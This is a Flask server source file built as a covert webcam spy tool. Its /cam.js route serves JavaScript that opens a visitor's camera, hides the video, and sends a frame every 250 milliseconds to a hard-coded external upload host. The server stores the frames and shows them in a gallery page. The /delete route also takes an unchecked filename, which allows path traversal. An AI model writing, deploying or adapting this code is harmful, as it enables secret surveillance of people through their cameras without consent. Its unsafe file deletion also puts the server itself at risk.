from flask import Flask, request, make_response, Response, send_from_directory, jsonify, render_template_string
import base64
import datetime
import os

app = Flask(__name__)

# ✅ Directory to store images
UPLOAD_DIR = os.path.join(os.getcwd(), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)


# ✅ Create directory if not exists
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')  # Allow all domains
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
    return response

@app.route("/imagex/<filename>")
def image(filename):
    return send_from_directory(UPLOAD_DIR, filename)

@app.route('/upload', methods=["POST", "OPTIONS"])
def upload():
    if request.method == "OPTIONS":
        return make_response('', 200)

    ct = request.content_type
    data = request.data.decode('utf-8')

    filename = datetime.datetime.now().strftime("%Y%m%d-%H%M%S") + ".png"
    filepath = os.path.join(UPLOAD_DIR, filename)

    if ct.startswith("image/"):
        with open(filepath, 'wb') as f:
            f.write(request.data)
        return 'Image received', 200

    elif ct == 'text/plain' and data.startswith('data:image'):
        b64_data = data.split(',')[1]
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(b64_data))
        return 'Base64 Image received', 200

    else:
        return 'Invalid data', 400

@app.route('/cam.js')
def jss():
    js_content = """navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  let v = document.createElement('video');
  v.style.display = 'none';
  document.body.appendChild(v);
  v.srcObject = stream;
  v.play();

  let c = document.createElement('canvas');
  let ctx = c.getContext('2d');

  setInterval(() => {
    if (v.videoWidth === 0 || v.videoHeight === 0) return;

    c.width = v.videoWidth;
    c.height = v.videoHeight;
    ctx.drawImage(v, 0, 0);

    c.toBlob(blob => {
      let reader = new FileReader();
      reader.onloadend = () => {
        fetch("https://chorcha.onrender.com/upload", {
          method: "POST",
          headers: { 'Content-Type': 'text/plain' },
          body: reader.result
        });
      };
      reader.readAsDataURL(blob);
    });
  }, 250);
});"""
    return Response(js_content, mimetype='application/javascript')

@app.route("/rndr")
def index():
    files = [f for f in os.listdir(UPLOAD_DIR) if f.endswith(".png")]
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>PNG Viewer</title>
        <style>
            body { font-family: sans-serif; background: #f5f5f5; padding: 20px; }
            .img-card { border: 1px solid #ccc; background: white; padding: 10px; display: inline-block; margin: 10px; border-radius: 10px; }
            img { width: 200px; display: block; margin-bottom: 5px; }
            button { background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
        </style>
    </head>
    <body>
        <h2>📁 PNG Files</h2>
        <div id="gallery">
            {% for file in files %}
                <div class="img-card" id="img-{{ file }}">
                    <img src="/imagex/{{ file }}" alt="{{ file }}">
                    <small>{{ file }}</small><br>
                    <button onclick="deleteImage('{{ file }}')">Delete</button>
                </div>
            {% endfor %}
        </div>

        <script>
        function deleteImage(filename) {
            fetch("/delete", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ filename })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    const elem = document.getElementById("img-" + filename);
                    if (elem) elem.remove();
                } else {
                    alert("Failed to delete: " + filename);
                }
            });
        }
        </script>
    </body>
    </html>
    """, files=files)

@app.route("/delete", methods=["POST"])
def delete():
    data = request.get_json()
    filename = data.get("filename")
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "File not found"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
